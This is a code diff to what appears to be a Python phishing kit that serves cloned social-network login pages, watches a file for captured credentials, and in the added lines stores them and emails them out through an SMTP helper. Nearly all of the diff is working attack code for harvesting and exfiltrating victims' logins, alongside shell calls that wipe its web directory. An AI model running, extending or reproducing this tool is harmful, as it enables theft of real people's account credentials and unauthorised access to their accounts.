@@ -18,8 +18,14 @@ import os
 from time import sleep
 from huepy import *
 import subprocess
+from core.email import send_mail
+from core.credentials import credentials
+from smtplib import SMTPSenderRefused, SMTPServerDisconnected
+from time import strftime
     
 def runPhishing(social, custom):
+    global _social
+    _social = social
     os.system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
     command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
     os.system(command)
@@ -35,10 +41,19 @@ def waitCreds():
     while True:
         with open('base/Server/www/cat.txt') as creds:
             lines = creds.read().rstrip()
-        if len(lines) != 0: 
-            print(green('\n [*] Credentials found:\n %s' % lines))                        
+        if len(lines) != 0:
+            print(green('\n [*] Credentials found:\n %s' % lines))
             os.system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
-        creds.close()
+            try:
+                credentials(lines.split('\n'), _social)
+                send_mail(lines.split('\n'),_social)
+            except NameError:
+                pass         
+            except SMTPSenderRefused:
+                print(red(' [!] Sorry, sender refused :('))
+                pass
+            except SMTPServerDisconnected:
+                pass
 
 @contextmanager
 def runServer(port: int):
